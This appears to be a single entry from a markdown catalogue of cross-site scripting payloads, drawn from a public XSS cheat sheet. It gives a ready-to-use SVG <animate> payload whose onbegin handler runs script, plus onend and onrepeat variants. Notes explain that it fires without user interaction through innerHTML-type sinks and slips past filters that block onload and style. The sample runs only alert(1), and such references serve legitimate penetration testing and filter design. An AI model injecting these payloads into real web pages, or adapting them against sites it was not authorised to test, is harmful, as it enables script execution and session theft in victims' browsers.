---
title: SVG Animate onbegin / onend / onrepeat (no interaction)
slug: svg-animate-begin-end
created_utc: 2026-05-12T00:00:00Z
updated_utc: 2026-05-12T00:00:00Z
tags: [payload, sink/dom-xss, sink/event-handler, sink/innerHTML]
inbound: []
---

# SVG Animate onbegin / onend / onrepeat (no interaction)

## Payload

```html
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
```

## Variants

```html
<svg><animate onend=alert(1) attributeName=x dur=1s>
<svg><animate onrepeat=alert(1) attributeName=x dur=1s repeatCount=2 />
```

## Context

Fires without user interaction when the SVG animation begins, ends, or repeats. Requires only `innerHTML`/`outerHTML`/`document.write` as the sink; no `<script>` tag needed and no `<style>` block needed. The `dur=1s` ensures the animation completes quickly so `onend` fires; `repeatCount=2` causes `onrepeat` to fire. Works in Chrome/Firefox/Safari with SVG animation support. Useful when `<body onload>` and `<style>` are blocked.

## Provenance

- Distilled from: `../../techniques/dom-xss/event-handler-matrix.md`
- Original source: `../../sources/portswigger-xss-cheatsheet.md`

## Linked techniques

- [Event Handler Matrix](../../techniques/dom-xss/event-handler-matrix.md)
